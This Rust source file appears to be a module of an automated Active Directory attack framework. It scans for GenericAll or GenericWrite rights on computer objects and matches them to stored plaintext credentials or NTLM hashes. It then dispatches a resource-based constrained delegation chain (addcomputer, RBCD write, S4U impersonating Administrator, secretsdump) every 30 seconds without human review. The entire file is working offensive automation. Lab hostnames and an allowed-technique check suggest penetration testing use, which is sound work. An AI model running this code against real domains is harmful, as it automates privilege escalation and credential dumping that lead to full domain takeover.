//! auto_rbcd_exploitation -- exploit GenericAll/GenericWrite on computer objects via RBCD.
//!
//! When a controlled user has GenericAll or GenericWrite on a computer object
//! (e.g., stannis → kingslanding$), this automation dispatches the full RBCD
//! chain: addcomputer → rbcd_write → S4U → secretsdump.
//!
//! This is separate from s4u.rs which handles pre-existing delegation vulns.
//! RBCD vulns are typically discovered via BloodHound edges.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for RBCD attacks.
const DEDUP_RBCD: &str = "rbcd_exploit";

/// Monitors for GenericAll/GenericWrite on computer objects and dispatches RBCD.
/// Interval: 30s.
pub async fn auto_rbcd_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("rbcd") {
            continue;
        }

        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<RbcdWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    let vtype = vuln.vuln_type.to_lowercase();

                    // Match vulns where a user has write access on a COMPUTER object.
                    // These come from BloodHound edges or ACL analysis.
                    let is_rbcd_candidate = vtype == "rbcd"
                        || vtype == "genericall_computer"
                        || vtype == "genericwrite_computer"
                        || (matches!(vtype.as_str(), "genericall" | "genericwrite")
                            && vuln
                                .details
                                .get("target_type")
                                .and_then(|v| v.as_str())
                                .is_some_and(|t| {
                                    t.to_lowercase() == "computer"
                                        || t.to_lowercase().ends_with('$')
                                }));

                    if !is_rbcd_candidate {
                        return None;
                    }

                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = format!("{DEDUP_RBCD}:{}", vuln.vuln_id);
                    if state.is_processed(DEDUP_RBCD, &dedup_key) {
                        return None;
                    }

                    // Extract source user (who has write access) and target computer
                    let source_user = vuln
                        .details
                        .get("source")
                        .or_else(|| vuln.details.get("source_user"))
                        .or_else(|| vuln.details.get("attacker"))
                        .or_else(|| vuln.details.get("account_name"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let target_computer = vuln
                        .details
                        .get("target")
                        .or_else(|| vuln.details.get("target_computer"))
                        .or_else(|| vuln.details.get("victim"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Find credential for the source user
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            c.username.to_lowercase() == source_user.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                        .cloned();

                    let hash = if credential.is_none() {
                        state
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == source_user.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                                    && (domain.is_empty()
                                        || h.domain.to_lowercase() == domain.to_lowercase())
                            })
                            .cloned()
                    } else {
                        None
                    };

                    if credential.is_none() && hash.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            source = %source_user,
                            "RBCD skipped: no cred/hash for source user"
                        );
                        return None;
                    }

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    // Resolve target computer IP from hosts
                    let target_ip = state.hosts.iter().find_map(|h| {
                        let tc = target_computer
                            .to_lowercase()
                            .trim_end_matches('$')
                            .to_string();
                        let h_lower = h.hostname.to_lowercase();
                        if h_lower == tc || h_lower.starts_with(&format!("{tc}.")) {
                            Some(h.ip.clone())
                        } else {
                            None
                        }
                    });

                    Some(RbcdWork {
                        vuln_id: vuln.vuln_id.clone(),
                        dedup_key,
                        source_user,
                        target_computer,
                        target_ip,
                        domain,
                        dc_ip,
                        credential,
                        hash,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "rbcd_attack",
                "vuln_type": "rbcd",
                "vuln_id": item.vuln_id,
                "target_computer": item.target_computer,
                "domain": item.domain,
                "impersonate": "Administrator",
            });

            if let Some(ref dc) = item.dc_ip {
                payload["dc_ip"] = json!(dc);
            }
            if let Some(ref tip) = item.target_ip {
                payload["target_ip"] = json!(tip);
            }

            if let Some(ref cred) = item.credential {
                payload["username"] = json!(cred.username);
                payload["password"] = json!(cred.password);
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            } else if let Some(ref hash) = item.hash {
                payload["username"] = json!(hash.username);
                payload["hash"] = json!(hash.hash_value);
            }

            let priority = dispatcher.effective_priority("rbcd");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        source = %item.source_user,
                        target = %item.target_computer,
                        "RBCD exploitation dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_RBCD, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_RBCD, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch RBCD exploit")
                }
            }
        }
    }
}

struct RbcdWork {
    vuln_id: String,
    dedup_key: String,
    source_user: String,
    target_computer: String,
    target_ip: Option<String>,
    domain: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    hash: Option<ares_core::models::Hash>,
}
